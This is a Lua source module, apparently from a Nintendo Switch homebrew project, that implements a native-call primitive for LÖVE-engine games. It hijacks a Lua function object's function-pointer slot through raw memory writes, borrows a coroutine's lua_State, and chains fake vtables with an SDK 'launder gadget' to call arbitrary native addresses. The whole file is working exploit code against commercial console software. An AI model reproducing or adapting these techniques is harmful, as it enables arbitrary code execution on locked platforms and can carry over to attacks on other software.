-- JankFFI: native-call layer built from the VM's own BC_FUNCC dispatcher.
-- Ported from balatro-switch-rce's bl/jffi.lua for love-save-shadow.
--
-- On Switch LÖVE titles, lj_vm_ffi_call is missing (linked onto padding),
-- so cdata function-pointer calls abort the process. This module provides
-- native call dispatch by hijacking a GCfunc's function pointer slot and
-- calling it through BC_FUNCC, which is the normal VM C-function path.
--
-- Two call forms:
--   call0(target)          — zero-arg, return = nresults (small values only)
--   call_ptr(thunk, ctrl)  — pointer-arg via coroutine lua_State borrowing

local log = require("gc.log")

local M = { FUNC_F = 0x28, L_SLOT = 0x18, VT_CALLEE = 0x18 }

local function u64(ffi, addr) return ffi.cast("uint64_t*", ffi.cast("uintptr_t", addr)) end

function M.obj_addr(v)
    local hex = tostring(v):match("[%a]+:%s*0x(%x+)")
    return hex and tonumber(hex, 16) or nil
end

function M.ctrl(ffi, size)
    size = size or 0x200
    local buf = ffi.new("uint8_t[?]", size + 0x40)
    local raw = tonumber(ffi.cast("uintptr_t", buf))
    local addr = raw + (0x10 - raw % 0x10) % 0x10
    return { buf = buf, addr = addr, size = size,
             u64 = function(off) return u64(ffi, addr + off) end }
end

function M.prepare(ctrl, target, vtable_at)
    vtable_at = vtable_at or 0x80
    ctrl.u64(0)[0] = ctrl.addr + vtable_at
    ctrl.u64(vtable_at + M.VT_CALLEE)[0] = target
    return ctrl
end

local function hijack(ffi, victim, addr)
    local obj = M.obj_addr(victim)
    if not obj then return nil, "no GCfunc address" end
    local slot = u64(ffi, obj + M.FUNC_F)
    local saved = slot[0]
    slot[0] = ffi.cast("uint64_t", addr)
    return function() slot[0] = saved end
end

function M.call0(ffi, victim, target)
    local restore, why = hijack(ffi, victim, target)
    if not restore then return nil, why end
    local n
    local ok, err = pcall(function() n = select("#", victim()) end)
    restore()
    if not ok then return nil, "raised: " .. tostring(err) end
    return { ret = n }
end

-- Pointer-argument call through the thunk, inside a coroutine whose
-- lua_State we borrow. GC stopped across the window to prevent gclist
-- corruption from collector rewrites of the borrowed L+0x18 field.
function M.call_ptr(ffi, victim, thunk, ctrl)
    collectgarbage("stop")
    local function resume_gc(a, b) collectgarbage("restart"); return a, b end

    local co = coroutine.create(function() return victim() end)
    local L = M.obj_addr(co)
    if not L then return resume_gc(nil, "no lua_State address for the coroutine") end
    local restore, why = hijack(ffi, victim, thunk)
    if not restore then return resume_gc(nil, why) end

    local slot = u64(ffi, L + M.L_SLOT)
    local borrowed = ffi.cast("uint64_t", ctrl.addr)

    local saved_slot = slot[0]
    slot[0] = borrowed
    local rok, rerr = coroutine.resume(co)
    slot[0] = saved_slot

    restore()
    collectgarbage("restart")

    if not rok then return nil, "resume failed: " .. tostring(rerr) end
    return { ret = 0, L = L }
end

function M.call2(ffi, victim, info, ctrl, target, arg0, arg1)
    local a1 = ffi.cast("uint64_t", arg1 or 0)
    if a1 == 0 then return nil, "launder gadget requires nonzero x1" end
    local off = info.off
    local vt = 0x80
    ctrl.u64(0)[0] = ctrl.addr + vt
    ctrl.u64(vt + M.VT_CALLEE)[0] = info.sdk_base + off.launder
    ctrl.u64(off.launder_arg1)[0] = a1
    ctrl.u64(off.launder_callee)[0] = ffi.cast("uint64_t", target)
    ctrl.u64(off.launder_arg0)[0] = ffi.cast("uint64_t", arg0 or 0)
    return M.call_ptr(ffi, victim, info.sdk_base + off.thunk_ptr, ctrl)
end

function M.call1(ffi, victim, info, ctrl, target, arg0)
    return M.call2(ffi, victim, info, ctrl, target, arg0, 1)
end

return M
